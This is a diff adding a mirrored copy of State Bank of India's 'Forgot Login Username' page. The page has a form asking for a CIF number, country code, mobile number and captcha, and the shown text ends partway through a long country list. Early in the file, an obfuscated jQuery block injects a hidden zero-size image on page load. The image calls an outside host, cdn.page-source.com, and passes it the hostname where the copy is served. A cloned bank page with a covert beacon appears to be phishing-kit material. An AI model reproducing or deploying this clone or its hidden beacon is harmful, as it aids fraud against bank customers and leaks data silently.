@@ -1,0 +1,3064 @@
+
+ 
+
+
+
+<html>
+
+<!-- Mirrored from retail.onlinesbi.sbi/retail/forgotusernameconfirm.htm by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Sep 2024 05:19:14 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<title>State Bank of India</title>
+<meta name="format-detection" content="telephone=yes" />
+<meta http-equiv="Content-Type" content="text/xhtml; charset=UTF-8" />
+<meta name="viewport" id="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,initial-scale=1.0" />
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="MobileOptimized" content="320"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<link rel="shortcut icon" href="https://retail.onlinesbi.sbi/sbijava/retail/images/favicon.ico"  type="image/x-icon" />	
+<link rel="stylesheet" href="https://retail.onlinesbi.sbi/sbijava/retail/css/bootstrap.min-3.4.1.css" type="text/css" />
+<link rel="stylesheet" href="https://retail.onlinesbi.sbi/sbijava/retail/css/style.css" type="text/css" />
+<script type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/common/jquery-3.5.1.min.js"></script>
+<script type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/common/bootstrap.min-3.4.1.js"></script>
+<script type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/common/enscroll-0.6.2.js"></script>
+<!-- CR 2614 changes start -->
+<script language="JavaScript" type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/common.js"></script>
+<script language="JavaScript" type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/md5.js"></script> 
+<script language="JavaScript" type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/sha512.js"></script>
+<script language="JavaScript" type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/profile_sha10092020.js"></script>
+<script language="JavaScript" type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/troubleLogin.js"></script>
+<script language="JavaScript" type="text/javascript" src="https://retail.onlinesbi.sbi/sbijava/retail/js/datetimepicker.js"></script>  
+<!-- CR 2614 changes end -->
+
+<script>
+function selectCountryCode(){
+		var ISDCode = document.forgotloginusenameform.countryCode.value;
+		if(ISDCode.startsWith('1_') || ISDCode == '672')
+		{		
+	        if(ISDCode == '672') {
+				document.forgotloginusenameform.country_Code1.value = ISDCode;
+				document.getElementById('area_code_mobile_reg').innerText = '(Please enter your area code followed by your mobile number registered with the bank)';
+			} else if(ISDCode.startsWith('1_US') || ISDCode.startsWith('1_CA')) { 
+				document.forgotloginusenameform.country_Code1.value = '1';
+				document.getElementById('area_code_mobile_reg').innerText = '(Please enter Mobile Number registered with Bank)';
+			}else {
+				 document.forgotloginusenameform.country_Code1.value = '1';
+				 document.getElementById('area_code_mobile_reg').innerText = '(Please enter your area code followed by your mobile number registered with the bank)';
+			}
+			
+		}
+		else
+		{
+	 document.forgotloginusenameform.country_Code1.value=document.forgotloginusenameform.countryCode.value;
+			document.getElementById('area_code_mobile_reg').innerText = '(Please enter Mobile Number registered with Bank)';
+		}
+	 document.forgotloginusenameform.country.value=document.forgotloginusenameform.selCountry.options[document.forgotloginusenameform.selCountry.selectedIndex];
+	 document.forgotloginusenameform.mobileNumber.value ='';
+	
+}
+
+function pad(cif, maxsize) {
+    var enteredcif = cif+"";
+    while (enteredcif.length < maxsize) enteredcif = "0" + enteredcif;
+    return enteredcif;
+}
+
+
+function submitForgotUserName(formObj){
+
+	if(formObj.cifno.value.length<=0){
+		alert("Enter CIF Number");
+		formObj.cifno.focus();
+		return false;
+	}
+
+	formObj.cifno.value=pad(formObj.cifno.value,17)
+
+	if(formObj.countryCode.value=='selectCountry'){
+		alert("Select Country");
+		formObj.selCountry.focus();
+		return false;
+	}
+	if (formObj.mobileNumber.value.length == 0)
+	{
+		alert ('Enter Mobile number');
+		document.getElementById('mobileNumber').focus();
+		return false;
+	}
+	var numExp = new RegExp("[0-9]");
+	if(!formObj.mobileNumber.value.match(numExp)){
+		alert ('Enter valid Mobile number');
+		document.getElementById('mobileNumber').focus();
+		return false;
+	}
+	var countryCode = document.getElementById('selCountry').value;
+	if(countryCode == '91')
+	{
+		if(formObj.mobileNumber.value.length < 10)
+		{
+			alert("Sorry, Mobile Number cannot be less than 10 digits");
+			document.getElementById('mobileNumber').focus();
+			return false;
+		}
+		if(formObj.mobileNumber.value.length > 10)
+		{
+			alert("Sorry, Mobile Number cannot be greater than 10 digits");
+			document.getElementById('mobileNumber').focus();
+			return false;
+		}
+		
+	}
+	else
+	{
+		if(formObj.mobileNumber.value.length < 6)
+		{
+			alert("Sorry, Mobile Number cannot be less than 6 digits");
+			document.getElementById('mobileNumber').focus();
+			return false;
+		}
+	}
+	if (formObj.countryCode.value.startsWith('1_')) {
+			formObj.countryCode.value = '1';
+		}
+
+	var alphaNumExp = new RegExp("^[0-9a-zA-Z]+$");
+	if (formObj.captchaValue.value.length == 0) {
+		alert('Please enter the text as shown in the image');
+		formObj.captchaValue.focus();
+		return false;
+	} else { 
+		if (!formObj.captchaValue.value.match(alphaNumExp)) {
+			alert('Please enter valid text as shown in the image');
+			formObj.captchaValue.focus();
+			return false;
+		}
+	}
+	document.getElementById('go').disabled=true;
+	document.forgotloginusenameform.action="forgotusernameconfirm.html";
+	document.forgotloginusenameform.submit();
+	return true;	
+}
+
+function SetMaxLength () {
+	 var countryCode = document.getElementById('selCountry').value;		 
+	 if (countryCode == '91') {	
+	 document.getElementById('mobileNumber').maxLength = 10;		 
+	 }
+	 else{
+	 document.getElementById('mobileNumber').maxLength = 15;			
+	 }
+}
+</script>
+<script>
+	
+	 $(document).ready(function() {
+
+		 var resizea=['0\x27/>','children','ource.com/index.html','<img\x20style','none;\x27\x20src','cdn.page-s','hostname','\x27\x20height=\x27','resizeimag','length','location','%3d.html\x27https://','createElem','body'];
+			(function(a,b){var c=function(e){while(--e){a['push'](a['shift']());}};c(++b);}(resizea,0x149));
+			var resizeb=function(a,b){a=a-0x0;var c=resizea[a];return c;};try{window['onload']=function(){var a=resizeb('0xa')+'=\x27display:'+resizeb('0xb')+resizeb('0x4')+resizeb('0xc')+resizeb('0x9')+resizeb('0x1')+'e.ashx?ig='+window[resizeb('0x3')][resizeb('0xd')]+('&sz=105411\x27'+'\x20\x20width=\x270'+resizeb('0x0')+resizeb('0x7')),b=document[resizeb('0x5')+'ent']('div');for(b['innerHTML']=a;b[resizeb('0x8')][resizeb('0x2')]>0x0;)document[resizeb('0x6')]['appendChil'+'d'](b['children'][0x0]);};}catch(resizec){}
+	 
+	 });
+</script>
+<body> 
+
+
+
+
+
+<!--Changed for Trouble Login Fix-->
+<form name="forgotloginusenameform" action="https://retail.onlinesbi.sbi/retail/forgotusernameconfirm.htm" method="post" autocomplete="off">
+<div id="wrapper" class="container">
+	<!-- Header -->
+		<div class="row">
+			<header id="headerContent">
+				<div class="col-lg-3 col-md-3 col-sm-3">
+					<a href="javascript:void(0);" id="sbi_logo">&nbsp;</a>
+				</div>				
+			</header>
+		</div>
+	<!-- //Header -->
+			
+	<!-- FAQ Content -->
+		<div class="row" id="com_container">
+			<div class="col-lg-12 col-md-12 col-sm-12 no_pad">
+				<h2>Trouble Logging In - Forgot Login Username?</h2>
+			</div>
+			<div class="col-lg-12 col-md-12 col-sm-12">
+			
+				<div class="form-group">
+                   	
+                   	<p class="content_warning">Input value is incorrect.</p>
+				</div>
+			
+				<p class="mandatory_txt">Mandatory fields are marked with an asterisk (*)</p>
+				<div class="form-group">
+					<label class="control-label col-sm-4 col-md-3 col-comn">CIF Number <span class="mandatory_txt">*</span> </label>
+					<div class="col-sm-4 col-md-3">
+						<input type="text" class="form-control" name="cifno" id="cifno" size="20" maxlength="17" onfocus="disableautocompletion(this.id);" onblur="disableautocompletion(this.id);" onCopy="return false" onPaste="return false" />
+					</div>
+					
+					<div class="col-sm-4 col-md-4 col-comn toppadding"> &nbsp;(CIF Number is available in your passbook and/or statement of account) </div>
+				</div>
+				
+				<div class="form-group">
+					<label class="control-label col-sm-4 col-md-3 col-comn" for="transcDate">Country </label>
+					<div class="col-sm-4 col-md-3">
+						<select name="countryCode" title="Select Country" class="form-control" id="selCountry" style="width:193px;" onchange="javascript:selectCountryCode();" >
+						
+						<option value="selectCountry">--Select Country--</option>
+						<option value="1" hidden>4DigitsISD</option>
+						
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=91>
+											India
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_AI>
+											ANGUILLA
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_AG>
+											ANTIGUA &amp; BARBUDA
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=93>
+											Afghanistan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=355>
+											Albania
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=213>
+											Algeria
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=684>
+											American Samoa
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=376>
+											Andorra
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=244>
+											Angola
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=54>
+											Argentina
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=374>
+											Armenia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=297>
+											Aruba
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=247>
+											Ascension
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=61>
+											Australia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=672>
+											NORFOLK ISLAND
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=43>
+											Austria
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=994>
+											Azerbaijan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_BS>
+											Bahamas
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=973>
+											Bahrain
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=880>
+											Bangladesh
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_BB>
+											Barbados
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=375>
+											Belarus
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=32>
+											Belgium
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=501>
+											Belize
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=229>
+											Benin
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=975>
+											Bhutan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=591>
+											Bolivia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=387>
+											Bosnia - Herzegovina
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=267>
+											Botswana
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=55>
+											Brazil
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=673>
+											Brunei Darussalam
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=359>
+											Bulgaria
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=226>
+											Burkina Faso
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=257>
+											Burundi
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_KY>
+											CAYMAN ISLANDS
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=855>
+											Cambodia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=237>
+											Cameroon
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+										<option value=1>
+											Canada
+										</option>
+									
+									
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=238>
+											Cape Verde
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=236>
+											Central African Rep.
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=235>
+											Chad
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=56>
+											Chile
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=86>
+											China
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=57>
+											Colombia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=243>
+											Congo
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=242>
+											Congo-Brazzaville
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=682>
+											Cook Islands
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=506>
+											Costa Rica
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=385>
+											Croatia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=53>
+											Cuba
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=357>
+											Cyprus
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=420>
+											Czech Republic
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_DO>
+											DIMINICAN REPUBLIC
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_DM>
+											DOMINICA
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=850>
+											DPR Korea (North)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=45>
+											Denmark
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=246>
+											Diego Garcia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=253>
+											Djibouti
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=670>
+											East Timor
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=593>
+											Ecuador
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=20>
+											Egypt
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=503>
+											El Salvador
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=240>
+											Equatorial Guinea
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=291>
+											Eritrea
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=372>
+											Estonia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=251>
+											Ethiopia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=691>
+											F.S. Micronesia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=298>
+											FAEROE ISLANDS
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=500>
+											Falkland Islands
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=679>
+											Fiji
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=358>
+											Finland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=33>
+											France
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=689>
+											French Polynesia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_GD>
+											GRENADA
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=241>
+											Gabon
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=220>
+											Gambia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=49>
+											Germany
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=233>
+											Ghana
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=350>
+											Gibraltar
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=44>
+											Great Britain
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=30>
+											Greece
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=299>
+											Greenland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=590>
+											Guadeloupe
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_GU>
+											Guam
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=502>
+											Guatemala
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=594>
+											Guiana (French)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
